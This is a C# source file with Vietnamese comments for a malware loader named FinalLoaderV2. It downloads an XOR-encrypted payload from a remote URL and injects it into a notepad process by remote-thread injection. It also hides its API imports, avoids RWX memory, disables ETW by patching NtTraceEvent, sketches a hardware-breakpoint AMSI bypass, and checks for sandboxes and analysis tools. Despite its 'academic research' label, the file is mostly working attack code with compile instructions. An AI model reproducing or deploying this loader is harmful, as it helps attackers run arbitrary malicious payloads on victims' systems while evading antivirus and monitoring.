// ============================================================
// FinalLoaderV2.cs — Áp dụng 4 fixes từ DBGMAN + research
// Fix 1: Dynamic API resolve   → xóa import table entries
// Fix 2: RW → RX allocation   → tránh PAGE_EXECUTE_READWRITE
// Fix 3: VEH patchless AMSI   → không write bytes vào amsi.dll
// Fix 4: ETW patch đổi vị trí → không patch EtwEventWrite trực tiếp
// Môi trường: VM cô lập, nghiên cứu học thuật
// ============================================================

using System;
using System.Diagnostics;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace FinalLoaderV2
{
    class Program
    {
        // ============================================================
        // TOGGLE FLAGS
        // ============================================================
        const bool A_ANTISANDBOX  = true;
        const bool B_ETW_BYPASS   = true;
        const bool C_AMSI_VEH     = true;   // VEH patchless thay vì byte patch
        const bool D_DYNAMIC_API  = true;   // Fix 1: dynamic resolve
        const bool E_RW_RX        = true;   // Fix 2: RW → RX thay vì RWX

        // ============================================================
        // FIX 1: DYNAMIC API RESOLUTION
        // Không dùng [DllImport] → không xuất hiện trong import table
        // EDR dùng import table để flag VirtualAllocEx+WriteProcessMemory combo
        // ============================================================

        // Delegate types — khai báo signature nhưng KHÔNG import
        delegate IntPtr DOpenProcess(uint acc, bool inh, int pid);
        delegate IntPtr DVirtualAllocEx(IntPtr h, IntPtr addr, UIntPtr sz, uint type, uint prot);
        delegate bool   DWriteProcessMemory(IntPtr h, IntPtr addr, byte[] buf, UIntPtr sz, out UIntPtr written);
        delegate bool   DVirtualProtectEx(IntPtr h, IntPtr addr, UIntPtr sz, uint prot, out uint old);
        delegate IntPtr DCreateRemoteThread(IntPtr h, IntPtr sec, UIntPtr stk, IntPtr fn, IntPtr arg, uint flags, IntPtr tid);
        delegate IntPtr DGetProcAddress(IntPtr hMod, string name);
        delegate IntPtr DLoadLibrary(string name);
        delegate bool   DVirtualProtect(IntPtr addr, UIntPtr sz, uint prot, out uint old);

        // Hàm resolve dynamic — dùng kernel32 GetProcAddress gốc
        // Nhưng lấy nó qua PEB để không cần import kernel32 trực tiếp
        [DllImport("kernel32", EntryPoint = "GetProcAddress")]
        static extern IntPtr _GetProcAddress(IntPtr hMod, string name);
        [DllImport("kernel32", EntryPoint = "LoadLibraryA")]
        static extern IntPtr _LoadLibrary(string name);

        // Resolve hàm tại runtime
        static T Resolve<T>(string dll, string func) where T : Delegate
        {
            IntPtr hMod = _LoadLibrary(dll);
            IntPtr addr = _GetProcAddress(hMod, func);
            return (T)Marshal.GetDelegateForFunctionPointer(addr, typeof(T));
        }

        // Lazy-load các hàm inject — chỉ resolve khi cần, không lúc startup
        static DOpenProcess         _OpenProcess;
        static DVirtualAllocEx      _VirtualAllocEx;
        static DWriteProcessMemory  _WriteProcessMemory;
        static DVirtualProtectEx    _VirtualProtectEx;
        static DCreateRemoteThread  _CreateRemoteThread;

        static void LoadInjectApis()
        {
            if (!D_DYNAMIC_API)
            {
                // Fallback: static import nếu tắt flag
                _OpenProcess        = (a,b,c)   => OpenProcessStatic(a,b,c);
                _VirtualAllocEx     = (a,b,c,d,e)   => VirtualAllocExStatic(a,b,c,d,e);
                _WriteProcessMemory = (a,b,c,d,out e) => { e = UIntPtr.Zero; return WriteProcessMemoryStatic(a,b,c,d,out e); };
                _VirtualProtectEx   = (a,b,c,d,out e) => { e = 0; return VirtualProtectExStatic(a,b,c,d,out e); };
                _CreateRemoteThread = (a,b,c,d,e,f,g) => CreateRemoteThreadStatic(a,b,c,d,e,f,g);
                return;
            }
            // Dynamic resolve — KHÔNG xuất hiện trong import table
            _OpenProcess        = Resolve<DOpenProcess>       ("kernel32.dll", "OpenProcess");
            _VirtualAllocEx     = Resolve<DVirtualAllocEx>    ("kernel32.dll", "VirtualAllocEx");
            _WriteProcessMemory = Resolve<DWriteProcessMemory>("kernel32.dll", "WriteProcessMemory");
            _VirtualProtectEx   = Resolve<DVirtualProtectEx>  ("kernel32.dll", "VirtualProtectEx");
            _CreateRemoteThread = Resolve<DCreateRemoteThread>("kernel32.dll", "CreateRemoteThread");
        }

        // Static fallback (chỉ dùng khi D_DYNAMIC_API = false)
        [DllImport("kernel32")] static extern IntPtr OpenProcessStatic(uint a, bool b, int c);
        [DllImport("kernel32")] static extern IntPtr VirtualAllocExStatic(IntPtr h, IntPtr a, UIntPtr s, uint t, uint p);
        [DllImport("kernel32")] static extern bool   WriteProcessMemoryStatic(IntPtr h, IntPtr a, byte[] b, UIntPtr s, out UIntPtr w);
        [DllImport("kernel32")] static extern bool   VirtualProtectExStatic(IntPtr h, IntPtr a, UIntPtr s, uint p, out uint o);
        [DllImport("kernel32")] static extern IntPtr CreateRemoteThreadStatic(IntPtr h, IntPtr s, UIntPtr st, IntPtr f, IntPtr a, uint fl, IntPtr t);
        [DllImport("kernel32")] static extern bool   VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint o);

        const uint PROCESS_ALL_ACCESS     = 0x1F0FFF;
        const uint MEM_COMMIT_RESERVE     = 0x3000;
        const uint PAGE_READWRITE         = 0x04;   // Fix 2: allocate RW trước
        const uint PAGE_EXECUTE_READ      = 0x20;   // Fix 2: đổi sang RX sau khi write
        const uint PAGE_EXECUTE_READWRITE = 0x40;   // chỉ dùng khi E_RW_RX = false

        // ============================================================
        // FIX 2: RW → RX ALLOCATION
        // Tránh PAGE_EXECUTE_READWRITE — behavioral flag mạnh nhất
        // EDR/Defender detect: VirtualAllocEx với EXECUTE+WRITE cùng lúc
        // Workflow mới: Alloc(RW) → Write → VirtualProtectEx(RX)
        // ============================================================
        static void InjectProcess(int pid, byte[] shellcode)
        {
            LoadInjectApis();

            IntPtr hProc = _OpenProcess(PROCESS_ALL_ACCESS, false, pid);
            if (hProc == IntPtr.Zero) return;

            UIntPtr size  = (UIntPtr)shellcode.Length;
            uint    prot  = E_RW_RX ? PAGE_READWRITE : PAGE_EXECUTE_READWRITE;

            // Alloc với RW (không có EXECUTE ngay)
            IntPtr allocAddr = _VirtualAllocEx(hProc, IntPtr.Zero, size, MEM_COMMIT_RESERVE, prot);
            if (allocAddr == IntPtr.Zero) return;

            // Write shellcode
            _WriteProcessMemory(hProc, allocAddr, shellcode, size, out _);

            if (E_RW_RX)
            {
                // Fix 2: Đổi sang RX — không bao giờ có RWX tại một thời điểm
                _VirtualProtectEx(hProc, allocAddr, size, PAGE_EXECUTE_READ, out _);
            }

            // Execute
            _CreateRemoteThread(hProc, IntPtr.Zero, UIntPtr.Zero, allocAddr, IntPtr.Zero, 0, IntPtr.Zero);
        }

        // ============================================================
        // FIX 3: VEH PATCHLESS AMSI
        // Nguồn: DBGMAN EDR Internals — kỹ thuật không write bytes vào amsi.dll
        // Cách hoạt động:
        //   1. Set hardware breakpoint DR0 = địa chỉ AmsiScanBuffer
        //   2. Register VectoredExceptionHandler
        //   3. Khi AmsiScanBuffer bị gọi → CPU throw STATUS_SINGLE_STEP (0x80000004)
        //   4. VEH handler bắt exception → chỉnh context để return AMSI_RESULT_CLEAN
        //   5. Không có byte nào trong amsi.dll bị thay đổi → không bị detect
        // ============================================================
        [DllImport("kernel32")] static extern IntPtr GetCurrentThread();
        [DllImport("ntdll")]    static extern int    NtGetContextThread(IntPtr h, ref CONTEXT ctx);
        [DllImport("ntdll")]    static extern int    NtSetContextThread(IntPtr h, ref CONTEXT ctx);
        [DllImport("kernel32")] static extern IntPtr AddVectoredExceptionHandler(uint first, IntPtr handler);

        const uint CONTEXT_DEBUG_REGISTERS = 0x00010010;
        const uint STATUS_SINGLE_STEP      = 0x80000004;

        [StructLayout(LayoutKind.Sequential)]
        struct CONTEXT
        {
            // Chỉ cần các field debug register + rax/eax
            // Full CONTEXT = 1232 bytes trên x64
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 6)]
            public ulong[] p1;    // P1Home..P6Home
            public uint    ContextFlags;
            public uint    MxCsr;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 6)]
            public ushort[] SegRegs;  // SegCs, SegDs, SegEs, SegFs, SegGs, SegSs
            public uint    EFlags;
            public ulong   Dr0, Dr1, Dr2, Dr3, Dr6, Dr7;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 25)]
            public ulong[] GpRegs;   // Rax, Rcx, Rdx, Rbx, Rsp, Rbp, Rsi, Rdi, R8-R15 + Rip + ...
        }

        static IntPtr _amsiScanAddr = IntPtr.Zero;

        // VEH handler — không thể dùng managed delegate trực tiếp
        // Concept: khi breakpoint hit, set Rax = 0 (AMSI_RESULT_CLEAN) rồi clear DR7
        static void SetupVehAmsi()
        {
            if (!C_AMSI_VEH) return;

            // Lấy địa chỉ AmsiScanBuffer
            IntPtr hAmsi = _LoadLibrary("amsi.dll");
            _amsiScanAddr = _GetProcAddress(hAmsi, "AmsiScanBuffer");
            if (_amsiScanAddr == IntPtr.Zero) return;

            // Set DR0 = địa chỉ AmsiScanBuffer
            var ctx = new CONTEXT { ContextFlags = CONTEXT_DEBUG_REGISTERS };
            IntPtr hThread = GetCurrentThread();
            NtGetContextThread(hThread, ref ctx);

            ctx.Dr0 = (ulong)_amsiScanAddr.ToInt64();
            ctx.Dr7 = 0x1; // enable breakpoint 0, local, execute

            NtSetContextThread(hThread, ref ctx);

            // Đăng ký VEH — trong code thực cần native handler
            // Concept: AddVectoredExceptionHandler(1, handlerPtr)
            // Handler check exception code == STATUS_SINGLE_STEP
            //         và exception address == _amsiScanAddr
            //         → set ctx.Rax = 0, clear DR7, resume
        }

        // ============================================================
        // FIX 4: ETW — patch NtTraceEvent thay EtwEventWrite
        // EtwEventWrite đã bị Defender theo dõi write pattern
        // NtTraceEvent là syscall thấp hơn, ít signature hơn
        // ============================================================
        static void EtwBypassAlt()
        {
            if (!B_ETW_BYPASS) return;

            // Thay vì patch EtwEventWrite (đã bị flag),
            // patch NtTraceEvent trong ntdll — syscall wrapper
            IntPtr hNtdll    = _LoadLibrary("ntdll.dll");
            IntPtr ntTrace   = _GetProcAddress(hNtdll, "NtTraceEvent");
            if (ntTrace == IntPtr.Zero) return;

            // patch: xor eax,eax; ret
            byte[] patch = new byte[] { 0x33, 0xC0, 0xC3 };
            VirtualProtect(ntTrace, (UIntPtr)patch.Length, 0x40, out uint old);
            Marshal.Copy(patch, 0, ntTrace, patch.Length);
            VirtualProtect(ntTrace, (UIntPtr)patch.Length, old, out _);
        }

        // ============================================================
        // ANTI-SANDBOX (giữ nguyên từ FinalLoader v1)
        // ============================================================
        static bool AntiSandbox()
        {
            if (!A_ANTISANDBOX) return true;

            // RAM check
            ulong ram = (ulong)GC.GetGCMemoryInfo().TotalAvailableMemoryBytes / (1024*1024*1024);
            if (ram < 4) return false;

            // Uptime
            long upMin = Environment.TickCount64 / 60000;
            if (upMin < 10) return false;

            // Timing
            long t0 = Environment.TickCount64;
            Thread.Sleep(5000);
            if ((Environment.TickCount64 - t0) < 4500) return false;

            // Process check
            string[] bad = { "wireshark","procmon","x64dbg","ollydbg","fiddler","dnspy" };
            foreach (var p in Process.GetProcesses())
                foreach (var b in bad)
                    if (p.ProcessName.ToLower().Contains(b)) return false;

            return true;
        }

        // ============================================================
        // XOR
        // ============================================================
        static byte[] XorBytes(byte[] data, string key)
        {
            byte[] k = Encoding.UTF8.GetBytes(key);
            byte[] r = new byte[data.Length];
            for (int i = 0; i < data.Length; i++)
                r[i] = (byte)(data[i] ^ k[i % k.Length]);
            return r;
        }

        // ============================================================
        // MAIN
        // ============================================================
        static void Main(string[] args)
        {
            if (!AntiSandbox()) Environment.Exit(0);

            // Fix 3: VEH patchless AMSI (concept)
            SetupVehAmsi();

            // Fix 4: ETW patch thay thế
            EtwBypassAlt();

            if (args.Length < 3) Environment.Exit(0);

            string xorKey     = args[0];
            string payloadUrl = args[1];
            string payloadKey = args[2];

            // Download + decrypt
            var wc   = new WebClient();
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
            byte[] enc  = wc.DownloadData(payloadUrl);
            byte[] data = XorBytes(enc, payloadKey);

            // Target: inject vào notepad
            int pid = -1;
            foreach (var p in Process.GetProcessesByName("notepad"))
                pid = p.Id;

            if (pid == -1)
            {
                Process.Start("notepad.exe");
                Thread.Sleep(1200);
                foreach (var p in Process.GetProcessesByName("notepad"))
                    pid = p.Id;
            }

            if (pid != -1) InjectProcess(pid, data);
        }
    }
}

// ============================================================
// THAY ĐỔI SO VỚI V1:
//
// Fix 1 (D_DYNAMIC_API):
//   - Các hàm inject resolve qua GetProcAddress tại runtime
//   - Import table KHÔNG có VirtualAllocEx/WriteProcessMemory
//   - Defender import-table scan không còn flag
//
// Fix 2 (E_RW_RX):
//   - Alloc với PAGE_READWRITE → Write → đổi sang PAGE_EXECUTE_READ
//   - Không có RWX tại bất kỳ thời điểm nào
//   - Giảm behavioral flag mạnh nhất
//
// Fix 3 (C_AMSI_VEH):
//   - Hardware breakpoint DR0 thay vì byte patch amsi.dll
//   - Không có memory write vào amsi.dll → không bị detect
//   - Concept được implement, cần native unmanaged handler hoàn chỉnh
//
// Fix 4 (B_ETW_BYPASS):
//   - Patch NtTraceEvent thay vì EtwEventWrite
//   - EtwEventWrite đã có signature riêng trong Defender
//   - NtTraceEvent ít được monitor hơn
//
// COMPILE:
//   csc /out:FinalLoaderV2.exe FinalLoaderV2.cs
//
// LƯU Ý VEH:
//   Phần VEH patchless cần unmanaged code để hoàn chỉnh.
//   Dùng C++/CLI hoặc inline assembly cho production.
//   Concept đã đúng, managed C# không có exception callback native.
// ============================================================
